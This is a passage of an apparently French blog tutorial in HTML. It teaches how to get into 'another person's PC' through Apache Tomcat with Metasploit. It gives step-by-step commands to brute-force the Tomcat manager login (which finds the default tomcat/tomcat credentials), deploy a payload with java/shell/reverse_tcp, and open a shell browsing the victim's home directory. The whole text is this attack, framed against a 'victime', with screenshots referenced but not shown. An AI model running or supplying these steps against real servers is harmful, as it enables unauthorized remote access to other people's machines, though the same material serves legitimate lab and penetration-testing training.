                   ...
                   <!-- <div class="blog-item"> -->
						...
						<div class="post-content">
							...
							<div class="blog-desc">
								...
								Voici un tutoriel afin d'avoir accès au PC d'un autre en exploitant la faille Apache Tomcat
								</blockquote>
								<div class="message-box">
								<p>Dans ce tutoriel, nous allons exploiter une faille sur le service Apache Tomcat, pour cela nous allons utiliser metasploitable-framework.</p>

								
								
							<p>	Dans un premier temps, nous allons utiliser la commande <b>use auxiliary/scanner/http/tomcat_mgr_login</b></p>
<br />

								<p><img src="../../images/tomcat1.jpg" alt="" class="img-fluid"><br /></p>

					<p>	Puis, nous allons utiliser la commande show options pour voir les options possibles pour cette faille :</p>



								<p><img src="../../images/tomcat2.jpg" alt="" class="img-fluid"><br /></p>

<p>Nous allons utiliser la commande set RHOSTS IP_de_la_victime :</p>


<p><img src="../../images/tomcat3.jpg" alt="" class="img-fluid"><br /></p>

<p>Puis nous allons utiliser la commande set RPORT 8180 : 
 <br /></p>

<p><img src="../../images/tomcat4.jpg" alt="" class="img-fluid"><br /></p>

<p>Ensuite nous allons lancer la commande exploit ou run et nous obtiendrons :  </p>
...
<p><img src="../../images/tomcat5.jpg" alt="" class="img-fluid"><br /></p>

<p>Le login est tomcat et le mot de passe est tomcat.
 <br /></p>

 <p>Maintenant nous allons utiliser ce login et le mot de passe pour entrer dans la machine victime.
 </p>

 <p>Nous allons utiliser la commande : use multi/http/tomcat_mgr_deploy :  </p>

<p><img src="../../images/tomcat6.jpg" alt="" class="img-fluid"><br /></p>

<p>Puis nous allons utiliser la commande set RPORT 8180 :   </p>


</p>
<p><img src="../../images/tomcat7.jpg" alt="" class="img-fluid"><br /></p>
<p>Nous allons utiliser la commande set RHOSTS IP_de_la_victime qui va mettre dans rhosts l’adresse ip de la victime :
</p>


<p><img src="../../images/tomcat8.jpg" alt="" class="img-fluid"><br /></p>

<p>Dans httpusername, nous allons mettre le login trouvé et httppassword, nous allons mettre le mot de passe :

 <br /></p>

<p><img src="../../images/tomcat9.jpg" alt="" class="img-fluid"><br /></p>

<p>Nous allons utiliser la première payload par set payload java/shell/reverse_tcp :  </p>


</p>
<p><img src="../../images/tomcat10.jpg" alt="" class="img-fluid"><br /></p>
<p>Nous allons choisir le target 1 qui correspond à un target java :
</p>


<p><img src="../../images/tomcat11.jpg" alt="" class="img-fluid"><br /></p>

<p>Pour finir, nous allons utiliser la commande exploit ou run pour exploiter la faille : 

 <br /></p>

<p><img src="../../images/tomcat12.jpg" alt="" class="img-fluid"><br /></p>

<p>Nous allons utiliser la commande shell :
  </p>

<p><img src="../../images/tomcat13.jpg" alt="" class="img-fluid"><br /></p>
</p>
<p>Ensuite nous allons utiliser la commande cd .. deux fois : 

  </p>

<p><img src="../../images/tomcat14.jpg" alt="" class="img-fluid"><br /></p>
</p>

<p><img src="../../images/tomcat15.jpg" alt="" class="img-fluid"><br /></p>
</p>

<p>Maintenant, nous pouvons voir que nous sommes entrés dans la machine de la victime dans le répertoire home.
